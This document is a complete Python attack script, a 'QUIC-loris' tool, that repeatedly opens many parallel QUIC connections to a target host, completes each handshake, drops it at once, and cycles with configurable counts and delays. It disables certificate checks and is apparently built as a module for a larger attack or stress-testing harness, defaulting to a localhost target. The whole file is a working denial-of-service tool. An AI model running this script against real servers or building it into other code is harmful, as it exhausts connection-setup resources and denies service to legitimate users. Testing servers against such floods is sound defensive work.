"""
QUIC-loris attack: repeated cycles of parallel handshake-and-drop connections.

Each cycle:
  1. Open `connection_count` parallel QUIC connections
  2. Complete each handshake
  3. Immediately close each connection
  4. Wait `cycle_delay` seconds
  5. Repeat

Analogous to HTTP Slowloris but targeting the QUIC connection-setup path.
"""

import asyncio
import ssl
import time
from urllib.parse import urlparse

from aioquic.asyncio import connect
from aioquic.asyncio.protocol import QuicConnectionProtocol
from aioquic.h3.connection import H3Connection, H3_ALPN
from aioquic.quic.configuration import QuicConfiguration
from aioquic.quic.events import QuicEvent


class LorisProtocol(QuicConnectionProtocol):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self._http: H3Connection | None = None
        self._ready = asyncio.Event()

    def quic_event_received(self, event: QuicEvent):
        if self._http is None:
            self._http = H3Connection(self._quic, enable_webtransport=True)
        for _ in self._http.handle_event(event):
            pass
        if not self._ready.is_set():
            self._ready.set()

    async def handshake_and_drop(self):
        try:
            await asyncio.wait_for(self._ready.wait(), timeout=5.0)
        except asyncio.TimeoutError:
            pass
        finally:
            try:
                self._quic.close()
                self.transmit()
            except Exception:
                pass


async def _one_connection(host: str, port: int, config: QuicConfiguration) -> float:
    """Returns round-trip time for the handshake in ms, or -1 on failure."""
    t0 = time.perf_counter()
    try:
        async with connect(host, port, configuration=config, create_protocol=LorisProtocol) as proto:
            await proto.handshake_and_drop()
        return (time.perf_counter() - t0) * 1000
    except Exception:
        return -1.0


def _parse_target(target_url: str, default_port: int = 4434) -> tuple[str, int]:
    u = urlparse(target_url if "://" in target_url else f"//{target_url}")
    return (u.hostname or "127.0.0.1"), (u.port or default_port)


async def run(target_url: str, params: dict, progress_callback) -> dict:
    """
    QUIC-loris: repeated cycles of `connections` parallel handshake-and-drop
    connections, waiting `cycleDelay`s between cycles, for `cycles` cycles.
    Result: {"cyclesCompleted": N, "connectionsPerCycle": N, "totalConnections": N}
    """
    host, port = _parse_target(target_url)
    connections = int(params.get("connections", 100))
    cycle_delay = float(params.get("cycleDelay", 30))
    cycles = int(params.get("cycles", 3))

    config = QuicConfiguration(
        alpn_protocols=H3_ALPN,
        is_client=True,
        max_datagram_frame_size=65536,
        verify_mode=ssl.CERT_NONE,
    )

    completed_cycles = 0
    total_connections = 0
    progress_callback(0, cycles, f"QUIC-loris: {connections} conns/cycle × {cycles} cycles → {host}:{port}")

    for c in range(1, cycles + 1):
        progress_callback(c - 1, cycles, f"Cycle {c}/{cycles}: opening {connections} connections")
        timings = await asyncio.gather(
            *(_one_connection(host, port, config) for _ in range(connections)),
            return_exceptions=True,
        )
        ok = sum(1 for t in timings if isinstance(t, float) and t >= 0)
        completed_cycles = c
        total_connections += connections
        progress_callback(c, cycles, f"Cycle {c}/{cycles} done: {ok}/{connections} handshakes")

        if c < cycles:
            await asyncio.sleep(cycle_delay)

    return {
        "cyclesCompleted": completed_cycles,
        "connectionsPerCycle": connections,
        "totalConnections": total_connections,
    }


if __name__ == "__main__":
    import argparse
    p = argparse.ArgumentParser()
    p.add_argument("--target", default="https://127.0.0.1:4434")
    p.add_argument("--count", type=int, default=100)
    p.add_argument("--delay", type=float, default=30.0)
    p.add_argument("--cycles", type=int, default=3)
    args = p.parse_args()
    asyncio.run(run(args.target, {"connections": args.count, "cycleDelay": args.delay, "cycles": args.cycles},
                    lambda c, t, m: print(f"[loris {c}/{t}] {m}", flush=True)))
